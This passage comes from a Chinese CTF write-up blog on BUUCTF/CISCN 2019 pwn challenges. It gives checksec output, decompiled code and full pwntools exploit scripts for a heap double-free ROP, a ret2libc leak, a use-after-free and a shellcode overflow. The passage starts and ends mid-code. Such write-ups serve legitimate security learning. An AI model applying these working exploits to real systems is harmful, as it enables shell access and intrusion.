class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;canary=&#x27;</span>,<span class="built_in">hex</span>(canary)</span><br><span class="line"><span class="comment">#重新分配到fake_chunk_stack_addr，布置rop</span></span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x78</span>,p64(fake_chunk_stack_addr)) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#16</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#17</span></span><br><span class="line"><span class="comment">#由于长度不够输入，我们调用read继续输入rop</span></span><br><span class="line">next_rop_addr = fake_chunk_stack_addr + <span class="number">0x88</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(next_rop_addr) + p64(pop_rdx) + p64(<span class="number">0x1000</span>) + p64(read_addr)</span><br><span class="line">add(<span class="number">0x78</span>,payload) <span class="comment">#18</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#由于无法触发main函数rop，因为有一个死循环，所以我们劫持new函数来rop到main后面</span></span><br><span class="line"><span class="comment">#接下来，分配到new函数的栈末尾处</span></span><br><span class="line">fake_chunk_stack_addr2 = stack_addr - <span class="number">0x246</span></span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x38</span>,p64(fake_chunk_stack_addr2)) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#16</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#17</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span>*<span class="number">0x6</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(add_rsp_148) <span class="comment">#跳到main函数后面的rop里</span></span><br><span class="line"><span class="comment">#new函数返回到add_rsp_148进而跳到main后面的rop里</span></span><br><span class="line">add(<span class="number">0x38</span>,payload)</span><br><span class="line"> </span><br><span class="line">flag_addr = next_rop_addr + <span class="number">0x88</span></span><br><span class="line"><span class="comment">#openat(0,flag_addr,0)</span></span><br><span class="line">rop = p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(openat_addr)</span><br><span class="line"><span class="comment">#read(fd,flag_addr,0x30)</span></span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line"><span class="comment">#puts(flag_addr)</span></span><br><span class="line">rop += p64(pop_rdi) + p64(flag_addr) + p64(puts_addr)</span><br><span class="line">rop += <span class="string">&#x27;/flag\x00&#x27;</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sh.send(rop)</span><br><span class="line"> </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn_2019_n_1"><a class="markdownIt-Anchor" href="#ciscn_2019_n_1"></a> ciscn_2019_n_1</h2>
<h3 id="1checksec-27"><a class="markdownIt-Anchor" href="#1checksec-27"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-26"><a class="markdownIt-Anchor" href="#2ida-26"></a> 2.IDA</h3>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE                            hh      iii                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>);</span><br><span class="line">  begin(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fflush(<span class="number">0LL</span>);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I think you can do it by yourself&quot;</span>);</span><br><span class="line">      begin(<span class="string">&quot;I think you can do it by yourself&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    encrypt();</span><br><span class="line">    begin(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>encrypt</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有binsh字符串，没有system函数,应该是一个puts函数泄露libc的题</p>
<blockquote>
<p>BUUCTF的resource一栏有libc.so文件</p>
</blockquote>
<h3 id="3exp-19"><a class="markdownIt-Anchor" href="#3exp-19"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25460</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_puts = libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0400c83</span></span><br><span class="line">leave_ret = <span class="number">0x04006b9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>) + p64(pop_rdi)+ p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;@\n&#x27;</span>)</span><br><span class="line">puts_real = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = puts_real - libc_puts</span><br><span class="line">system_real = system + libc_base</span><br><span class="line">binsh_real = binsh + libc_base</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>) + p64(leave_ret) + p64(pop_rdi) + p64(binsh_real) + p64(system_real)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>还有一个坑就是Ubuntu18下面调用system要对齐栈，就需要用一个ret<br />
参照EXP:[<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f6839b1e7283">https://www.jianshu.com/p/f6839b1e7283</a>](</p>
</blockquote>
<h2 id="ciscn_2019_n_3"><a class="markdownIt-Anchor" href="#ciscn_2019_n_3"></a> ciscn_2019_n_3</h2>
<h3 id="1checksec-28"><a class="markdownIt-Anchor" href="#1checksec-28"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-27"><a class="markdownIt-Anchor" href="#2ida-27"></a> 2.IDA</h3>
<p>发现程序有三个功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1. New note&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2. Del note&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3. Show note&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;4. Purchase Pro Edition&quot;</span>) <span class="comment">//这个没用</span></span><br></pre></td></tr></table></figure>
<p><strong>rec_str_free</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">rec_str_free</span><span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="type">void</span> **)ptr + <span class="number">2</span>));</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Note freed!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>free后指针未清零</p>
</blockquote>
<h3 id="3gdb动态调试"><a class="markdownIt-Anchor" href="#3gdb动态调试"></a> 3.GDB动态调试</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//code:</span></span><br><span class="line">	newnote(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">10</span>,<span class="number">0x88</span>)</span><br><span class="line"><span class="comment">//gdb</span></span><br><span class="line"><span class="number">0x8cf7000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">17</span>, </span><br><span class="line">  fd = <span class="number">0x80486de</span> &lt;rec_str_print&gt;, </span><br><span class="line">  bk = <span class="number">0x8048725</span> &lt;rec_str_free&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x8cf7018</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x91</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x8cf7010</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">147812376</span>, </span><br><span class="line">  size = <span class="number">145</span>, </span><br><span class="line">  fd = <span class="number">0x61616161</span>, </span><br><span class="line">  bk = <span class="number">0x61616161</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0xa6161</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>发现申请的堆里面含有rec_str_free的指针</p>
<blockquote>
<p>我们可以利用UAF来修改指针，从而getshell</p>
</blockquote>
</blockquote>
<h3 id="4exp-9"><a class="markdownIt-Anchor" href="#4exp-9"></a> 4.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;ciscn_2019_n_3&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_n_3&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(rmt,port)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">idx,<span class="built_in">type</span>,value,length=<span class="number">0</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;CNote &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Type &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Value &gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(value))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">            p.recvuntil(<span class="string">&quot;Length &gt; &quot;</span>)</span><br><span class="line">            p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">            p.recvuntil(<span class="string">&quot;Value &gt; &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> length == <span class="number">8</span>:</span><br><span class="line">                p.send(value)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p.sendline(value)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;CNote &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;CNote &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    newnote(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">10</span>,<span class="number">0x88</span>)</span><br><span class="line">    newnote(<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">10</span>,<span class="number">0x38</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    newnote(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x41</span>)</span><br><span class="line">    <span class="comment">#newnote(2,2,&#x27;b&#x27;*10,0x38)</span></span><br><span class="line">    delnote(<span class="number">1</span>)</span><br><span class="line">    delnote(<span class="number">2</span>)</span><br><span class="line">    newnote(<span class="number">3</span>,<span class="number">2</span>,<span class="string">&#x27;aaaa&#x27;</span>+p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]),<span class="number">0xc</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    newnote(<span class="number">4</span>,<span class="number">2</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0x38</span>)</span><br><span class="line">    delnote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn_2019_n_5"><a class="markdownIt-Anchor" href="#ciscn_2019_n_5"></a> ciscn_2019_n_5</h2>
<h3 id="1checksec-29"><a class="markdownIt-Anchor" href="#1checksec-29"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<h3 id="2ida-28"><a class="markdownIt-Anchor" href="#2ida-28"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;name, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(&amp;v4, &amp;name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>name</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000601080                 public name</span><br><span class="line">.bss:0000000000601080 name            db    ? ;               ; DATA XREF: main+35↑o</span><br><span class="line">.bss:0000000000601081                 db    ? ;</span><br><span class="line">.bss:0000000000601082                 db    ? ;</span><br><span class="line">.bss:0000000000601083                 db    ? ;</span><br><span class="line">.bss:0000000000601084                 db    ? ;</span><br><span class="line">.bss:0000000000601085                 db    ? ;</span><br><span class="line">.bss:0000000000601086                 db    ? ;</span><br><span class="line">.bss:0000000000601087                 db    ? ;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>既然没有保护，应该是shellcode，所以不要往复杂的方向想</p>
<p>shellcode + 溢出 + 栈转移</p>
</blockquote>
<h3 id="3exp-20"><a class="markdownIt-Anchor" href="#3exp-20"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26651</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_n_5&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x0601080</span></span><br><span class="line"></span><br><span class="line">shellcode  = asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&#x27;tell me your name\n&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(name_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;me?&#x27;</span>)</span><br><span 